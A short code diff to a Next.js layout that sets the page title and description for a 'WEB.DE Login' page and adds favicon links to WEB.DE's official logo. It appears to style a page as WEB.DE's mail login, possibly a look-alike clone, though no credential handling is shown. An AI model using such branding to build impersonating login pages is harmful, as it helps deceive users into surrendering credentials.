@@ -19,9 +19,21 @@ interface LayoutProps {
 }
 
 export const metadata: Metadata = {
-  title: "Login",
+  title: "WEB.DE Login - E-Mail-Adresse und Passwort",
   description:
-    "Mobiler Login ins WEB.DE Postfach: Hier Kønne Sie sich mit dem smartphone und Tablet schnell ran sicher von unter…...",
+    "Mobiler Login ins WEB.DE Postfach: Hier können Sie sich mit dem Smartphone und Tablet schnell und sicher anmelden...",
+  icons: {
+    // Dynamically appends the shortcut links directly to the document head
+    icon: [
+      {
+        url: "https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg",
+        type: "image/svg+xml",
+      },
+    ],
+    shortcut:
+      "https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg",
+    apple: "https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg",
+  },
 };
 
 export default async function RootLayout({ children, params }: LayoutProps) {
